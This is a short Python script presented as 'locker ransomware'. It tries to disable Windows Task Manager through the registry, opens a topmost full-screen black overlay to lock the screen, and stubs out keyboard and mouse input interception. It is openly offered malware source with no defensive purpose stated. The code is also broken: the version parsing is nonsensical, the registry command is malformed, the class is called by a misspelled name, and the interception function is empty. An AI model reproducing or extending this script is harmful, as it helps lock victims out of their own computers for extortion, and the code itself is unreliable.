import os
import sys
from subprocess import Popen, PIPE

# Get system details
platform = sys.platform
os_version = platform[4:].split('.')[0] + '.' + platform[4:].split('.')[1]
screen_width, screen_height = os.get_terminal_size()

print(f'System: {platform}')
print(f'OS Version: {os_version}')
print(f'Screen Resolution: {screen_width}x{screen_height}')

# Disable task manager and system hotkeys

def disable_task_manager():
    registry_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    value_name = 'DisableTaskMgr'
    Popen(['regedit', f'/{registry_key}/v{value_name}', '0'], stdout=PIPE, stderr=PIPE)

disable_task_manager()

# Create full-screen GUI window

import tkinter as tk
from PIL import Image, ImageTk

class LockerRansomwareGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.geometry(f'{screen_width}x{screen_height}')
        self.root.attributes('-topmost', 1)
        
        # Create a blank image to overlay
        self.blank_image = Image.new('RGB', (screen_width, screen_height), color='black')

        # Display the overlay
        img = ImageTk.PhotoImage(self.blank_image)
        self.canvas = tk.Canvas(self.root, width=screen_width, height=screen_height)
        self.canvas.create_image(screen_width/2, screen_height/2, image=img)

    def run(self):
        self.root.mainloop()

locker_ransomware_gui = LockerRansomWareGUI()
locker_ransomware_gui.run()

# Input interception

def capture_input():
    # TODO: Implement input interception logic
    pass

capture_input()
